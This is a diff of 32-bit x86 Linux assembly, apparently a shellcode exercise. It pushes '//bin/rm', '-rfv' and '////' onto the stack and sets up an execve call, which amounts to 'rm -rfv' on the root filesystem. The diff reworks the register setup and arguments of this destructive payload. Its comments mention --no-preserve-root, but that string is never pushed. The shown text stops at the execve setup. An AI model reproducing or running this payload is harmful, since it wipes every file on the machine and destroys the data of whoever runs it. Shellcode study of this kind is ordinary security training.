@@ -6,24 +6,47 @@ global _start
 section .text
 
 _start:
+    ; xoring registers
 
-    xor eax, eax            ;create null eax register
-    push eax                ;push null eax register to the stack
+    xor eax, eax
+    xor ecx, ecx
+    xor edx, edx
+    
+    ; push null eax register to the stack
 
-    push 0x6d722f6e         ;push command to the stack
-    push 0x69622f2f         ;"//bin/rm"
-    mov ebx, esp            ;move pointer to command into ebx
+    push eax                
 
-    push eax                ;push null eax register to the stack
+    ; push //bin/rm to the stack and save it into ebx
+
+    push 0x6d722f6e
+    push 0x69622f2f
+    mov ebx, esp
+
+    ; push null eax register to the stack
+
+    push eax
+
+    ; push --no-preserve-root to the stack and save it into edx
+    ; push //// to the stack and save it into ecx
+
     push 0x2f2f2f2f
-    push eax         
-    push 0x2066722d
-    mov esi, esp            ;move stack pointer to esi
+    mov ecx, esp
 
-    push eax                ;push null eax register to the stack
-    push esi                ;push address of the argument to the stack
-    push ebx                ;push address of the command to the stack
-    mov ecx, esp            ;move pointer to start of the command to ecx
+    ; push null eax register to the stack
+
+    push eax
+
+    ; push -rf to the stack and save it into esi
+    
+    push 0x7666722d
+    mov esi, esp
+
+    ; push everything on the stack
+    push eax
+    push ecx
+    push esi
+    push ebx
+    mov ecx, esp
 
 
     mov al, 11              ;define execve
